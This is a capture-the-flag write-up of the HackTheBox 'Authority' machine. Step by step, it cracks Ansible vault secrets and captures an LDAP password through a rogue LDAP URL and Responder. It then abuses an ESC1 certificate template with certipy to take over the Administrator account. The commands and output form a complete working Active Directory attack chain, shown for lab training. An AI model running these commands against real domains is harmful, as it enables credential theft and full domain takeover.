---
title: 'HackTheBox | Authority'
published: 2026-10-2
draft: false
description: 'HackTheBox Machine `Authority` writeup.'
tags: ['HackTheBox', 'windows', 'active-directory', 'ESC1', 'ADCS']
---

## Recon

## Port Scan

```
# Nmap 7.95 scan initiated Fri Oct  2 02:42:43 2026 as: nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,7263,8443,9389,13864,25162,32686,42916,45530,47001,47656,49664,49665,49666,49667,49671,49674,49675,49679,49682,49691,49699,60125,62184,63496 -Pn -n -vv -oN nmap/tcp_deep 10.129.49.174
Nmap scan report for 10.129.49.174
Host is up, received user-set (0.20s latency).
Scanned at 2026-10-02 02:42:43 EDT for 77s

PORT      STATE  SERVICE       REASON       VERSION
53/tcp    open   domain        syn-ack      Simple DNS Plus
80/tcp    open   http          syn-ack      Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open   kerberos-sec  syn-ack      Microsoft Windows Kerberos (server time: 2026-10-02 10:41:50Z)
135/tcp   open   msrpc         syn-ack      Microsoft Windows RPC
139/tcp   open   netbios-ssn   syn-ack      Microsoft Windows netbios-ssn
389/tcp   open   ldap          syn-ack      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-02T10:42:59+00:00; +3h58m59s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
<SNIP>
445/tcp   open   microsoft-ds? syn-ack
464/tcp   open   kpasswd5?     syn-ack
593/tcp   open   ncacn_http    syn-ack      Microsoft Windows RPC over HTTP 1.0
636/tcp   open   ssl/ldap      syn-ack      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-02T10:42:59+00:00; +3h59m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
<SNIP>
3268/tcp  open   ldap          syn-ack      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-02T10:42:58+00:00; +3h59m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
<SNIP>
3269/tcp  open   ssl/ldap      syn-ack      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
<SNIP>
|_ssl-date: 2026-10-02T10:42:59+00:00; +3h59m00s from scanner time.
5985/tcp  open   http          syn-ack      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open   ssl/http      syn-ack      Apache Tomcat (language: en)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-30T10:36:38
| Not valid after:  2028-10-01T22:15:02
| MD5:   a29e:4afd:7934:d961:50c8:de72:936a:b2be
| SHA-1: 98ef:cfa6:69c5:42f1:8688:a649:fb84:2420:36ac:a735
| -----BEGIN CERTIFICATE-----
<SNIP>
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
9389/tcp  open   mc-nmf        syn-ack      .NET Message Framing
<SNIP>
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
<SNIP>
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
<SNIP>
```

- Nmap shows the following ports open:
  - Port 53 - DNS
  - Port 80 - HTTP
  - Port 88 - Kerberos
  - Port 135/139/445 - SMB
  - Port 389 - LDAP
  - Port 636 - LDAPS
  - Port 8443 - HTTPS (Apache Tomcat)
- Domain name: `authority.htb`
- Domain Controller hostname: `authority.authority.htb`
- Certificate Authority name: `htb-AUTHORITY-CA`

I'll use `NetExec` to generate a `hosts` file and add it to my machine.

```shell
$ nxc smb $IP --generate-hosts-file hosts.txt
$ cat hosts.txt | sudo tee -a /etc/hosts
10.129.229.56     AUTHORITY.authority.htb authority.htb AUTHORITY
```

## HTTP @80

- The site loads the default IIS web page.
- Any directory or subdomain bruteforcing did not return any new results.

## HTTPS @8443

- The site returns an instance of Password Manager (PWM project).
- PWM is an open-source password self-service application for LDAP directories.
- It requires a valid set of credentials to log in and perform any functions.
- The home page highlights authentication attempts from previous users:
  - `svc_pwm`
  - `svc_ldap` (from source code in Burp)

## SMB Enumeration

- Since I don't have any valid credentials, I'll try to authenticate using the guest account.

```shell
$ nxc smb $IP -u '' -p '.'
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\:. (Guest)
```

- There are two shares different from the default shares: `Department Shares` and `Development`. With null authentication, I can `READ` the **Development** share.

#### Enumerating the Development Share

- Instead of using `smbclient`, this time I'll mount the share on my host.

```shell
$ sudo mount -t cifs //$IP/Development/ ./DevelopmentShare -o 'username=,password='
```

- Inside the Development share, there are multiple `ansible scripts`:

```

├── ADCS
│   ├── defaults
│   │   └── main.yml
│   ├── LICENSE
│   ├── meta
│   │   ├── main.yml
│   │   └── preferences.yml
│   ├── molecule
│   │   └── default
│   │       ├── converge.yml
│   │       ├── molecule.yml
│   │       └── prepare.yml
│   ├── README.md
│   ├── requirements.txt
│   ├── requirements.yml
│   ├── SECURITY.md
│   ├── tasks
│   │   ├── assert.yml
│   │   ├── generate_ca_certs.yml
│   │   ├── init_ca.yml
│   │   ├── main.yml
│   │   └── requests.yml
│   ├── templates
│   │   ├── extensions.cnf.j2
│   │   └── openssl.cnf.j2
│   ├── tox.ini
│   └── vars
│       └── main.yml
├── LDAP
│   ├── defaults
│   │   └── main.yml
│   ├── files
│   │   └── pam_mkhomedir
│   ├── handlers
│   │   └── main.yml
│   ├── meta
│   │   └── main.yml
│   ├── README.md
│   ├── tasks
│   │   └── main.yml
│   ├── templates
│   │   ├── ldap_sudo_groups.j2
│   │   ├── ldap_sudo_users.j2
│   │   ├── sssd.conf.j2
│   │   └── sudo_group.j2
│   ├── TODO.md
│   ├── Vagrantfile
│   └── vars
│       ├── debian.yml
│       ├── main.yml
│       ├── redhat.yml
│       └── ubuntu-14.04.yml
├── PWM
│   ├── ansible.cfg
│   ├── ansible_inventory
│   ├── defaults
│   │   └── main.yml
│   ├── handlers
│   │   └── main.yml
│   ├── meta
│   │   └── main.yml
│   ├── README.md
│   ├── tasks
│   │   └── main.yml
│   └── templates
│       ├── context.xml.j2
│       └── tomcat-users.xml.j2
└── SHARE
    └── tasks
        └── main.yml
```

#### Ansible PWM Scripts

- The `defaults` folder is a sub-directory inside an Ansible role used to store default variable values.
- It contains encrypted blocks as values for 3 variables:
  - `pwm_admin_login`
  - `pwm_admin_password`
  - `ldap_admin_password`
- These blocks are encrypted using the AES algorithm with a `secret string`. Decrypting them requires knowing the `secret string`.
- I'll save all 3 in a file and run `ansible2john` against them to extract their hashes.

```shell
$ cat PWM/pwm-hashes.txt
pwm_admin_login:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
ldap_pass:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
```

- I'll run `john` with `rockyou.txt` to crack these hashes. All of them use the same string:

```
pwm_admin_login:!@#$%^&*
pwm_admin_password:!@#$%^&*
ldap_admin_password:!@#$%^&*
```

- `!@#$%^&*` is the `secret string` used to encrypt the plaintext values into encrypted blocks.
- Now I'll use the `ansible-vault decrypt` command to recover the plaintext values.

```shell
$ ansible-vault decrypt PWM/pwm_admin_login --output -
Vault password:
Decryption successful
svc_pwm
$ ansible-vault decrypt PWM/pwm_admin_password --output -
Vault password:
Decryption successful
pWm_@dm!N_!23
$ ansible-vault decrypt PWM/ldap_admin_password --output -
Vault password:
Decryption successful
DevT3st@123
```

- I tried both credential sets, `svc_pwm / pWm_@dm!N_!23` and `svc_ldap / DevT3st@123`, against SMB and LDAP, but neither worked.
- `svc_pwm / pWm_@dm!N_!23` worked for logging into the PWM instance on port 8443.

---

## Shell as `svc_ldap`

- I'll log into the PWM instance and go to `Configuration Editor`.
- There are too many configuration settings to look through.
- After a bit of looking around, in the `LDAP → LDAP Directories → default → Connection` page, there's an `LDAP Proxy Password` field.
- I can change it, but I cannot read the current password value.
- There's also a field for `LDAP URLs`, which is a set of URLs the application will attempt to authenticate to.
- I can add a URL pointing to my attack box and get the application to authenticate to it over an unencrypted connection, revealing the password used.
- I'll add a URL pointing to port 389 and start `responder` on my attack box.
- On clicking `Test LDAP Profile`, I receive an authentication attempt that reveals the LDAP password.

```shell
$ sudo responder -I tun0
<SNIP>
[+] Listening for events...

[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

- This set of credentials is valid for both `SMB` and `WinRM`.

```shell
$ nxc smb $IP -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!

$ nxc winrm $IP -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
WINRM       10.129.229.56   5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.129.229.56   5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```

- Using these, I can now read the `Department Shares` share, but there are no files inside it.
- I'll log in with WinRM and read the user flag.

```shell
$ evil-winrm -i $IP -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> cat ..\Desktop\user.txt
8c98e30e640a43b1a***************
```

---

## Privilege Escalation

- Since a Certificate Authority is in play, I'll use `certipy` with `svc_ldap`'s credentials to look for any vulnerable templates.

```shell
$ certipy find -vulnerable -stdout -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip $IP
<SNIP>
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

- It found a template, `CorpVPN`, vulnerable to the `ESC1` misconfiguration.
- This misconfiguration allows a user to issue a certificate for any user in the domain.
- To exploit this, the following conditions must be met:
  - **The Enterprise CA grants enrollment rights to low-privileged users**: in this case, the `Domain Computers` group has access to enroll for this certificate.
  - **Manager approval must be turned off**: `Requires Manager Approval: False`.
  - **No authorized signatures are required**: `Authorized Signatures Required: 0`.
  - **The certificate template defines EKUs that enable authentication**: `Extended Key Usage: Client Authentication`.
  - **The certificate template allows requesters to specify a `subjectAltName` (SAN) in the CSR**: `Enrollee Supplies Subject: True`.

### Exploiting ESC1

- To exploit this, I would need a `Domain Computer` account that has permission to issue this certificate.
- Fortunately, I can create one, since `MachineAccountQuota` allows for up to 10 computer accounts.

```shell
$ nxc ldap $IP -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
LDAP        10.129.229.56   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.229.56   389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
MAQ         10.129.229.56   389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.129.229.56   389    AUTHORITY        MachineAccountQuota: 10
```

- I'll use `impacket-addcomputer` to create a computer account and add it to the `Domain Computers` group.

```shell
$ impacket-addcomputer -computer-name C0nn3R -computer-pass 'Password@123$' -computer-group 'CN=DOMAIN COMPUTERS,CN=USERS,DC=AUTHORITY,DC=HTB' authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'
[*] Successfully added machine account C0nn3R$ with password Password@123$.
```

- I can verify it by running the following LDAP query.

```shell
$ nxc ldap $IP -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --query "(objectClass=computer)" "sAMAccountName dnsHostName operatingSystem"
<SNIP>
LDAP        10.129.229.56   389    AUTHORITY        [+] Response for object: CN=C0nn3R,CN=Computers,DC=authority,DC=htb
LDAP        10.129.229.56   389    AUTHORITY        sAMAccountName       C0nn3R$
```

- Now I have everything I need and can request a certificate to authenticate as the `administrator` user.

```shell
$ certipy req -u 'C0nn3R$' -p 'Password@123$' -dc-ip $IP -ca AUTHORITY-CA -template CorpVPN -upn Administrator
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

### Authenticating as `Administrator`

```shell
$ certipy auth -pfx administrator.pfx -username administrator -domain authority.htb -dc-ip $IP
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@authority.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

- The first authentication attempt failed with the error `KDC_ERR_PADATA_TYPE_NOSUPP (KDC has no support for padata type)`.
- A quick workaround is to use the `-ldap-shell` flag with `certipy`, which provides a limited set of commands to run as the authenticating user, i.e., the Domain Administrator.

```shell
$ certipy auth -ldap-shell -pfx administrator.pfx -username administrator -domain authority.htb -dc-ip $IP
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Connecting to 'ldaps://10.129.229.56:636'
[*] Authenticated to '10.129.229.56' as: 'u:HTB\\Administrator'
Type help for list of commands

# whoami
u:HTB\Administrator
```

- I can use this access to change the password of `Administrator`.

```shell
# change_password administrator 'Password@123$'
Got User DN: CN=Administrator,CN=Users,DC=authority,DC=htb
Attempting to set new password of: Password@123$
Password changed successfully!
```

- Finally, I can log in with WinRM using the new password and read the root flag.

```shell
$ evil-winrm -i $IP -u administrator -p 'Password@123$'
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
171f01545ca1fc124ec*************
```
